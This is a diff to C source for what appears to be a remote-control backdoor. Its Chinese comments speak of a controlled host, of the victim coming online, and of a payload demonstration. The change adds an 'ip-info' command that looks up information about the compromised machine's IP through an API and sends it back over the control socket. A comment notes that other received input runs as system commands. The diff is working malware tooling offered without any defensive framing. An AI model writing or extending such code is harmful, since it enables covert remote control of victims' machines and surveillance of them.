@@ -5,8 +5,9 @@
 #include <libgen.h>
 #include <time.h>
 
-// 版本信息头文件
+// 项目的头文件
 #include "version.h"
+#include "IP_info.h"
 
 
 
@@ -290,6 +291,26 @@ int show_logo_info(int s) {
     return 0;
 }
 
+// 通过API根据受控端IP获取的信息
+int IP_INFO(int s)
+{
+    char ip_info_buf[1024] = {0};
+    // 整段清空缓冲区
+    memset(ip_info_buf, 0, sizeof(ip_info_buf));
+
+    get_online_info(ip_info_buf, sizeof(ip_info_buf)-2); // 预留\r\n位置
+    
+    // 安全拼接换行
+    strncat(ip_info_buf, "\r\n", 2);
+
+    int len = strlen(ip_info_buf);
+    // 判断发送是否成功
+    if(send(s, ip_info_buf, len, 0) <= 0)
+    {
+        return -1; // 发送失败
+    }
+    return 0;
+}
 
 // 成功上线演示提示
 int Payload_Demonstrate(void) {
@@ -397,6 +418,11 @@ int main(int argc, char *argv[], char *envp[]) {
             
             buf[strcspn(buf, "\r\n")] = 0;
             if (strlen(buf) == 0) continue;
+
+	    if (strcmp(buf, "ip-info") == 0) {
+                IP_INFO(s);
+                continue;  // 🌟 务必加上 continue，防止命令被当作系统命令再次执行
+            }
             
             if (strcmp(buf, "exit") == 0 || strcmp(buf, "quit") == 0) {
                 send(s, "[-] Logout.\n", 12, 0);
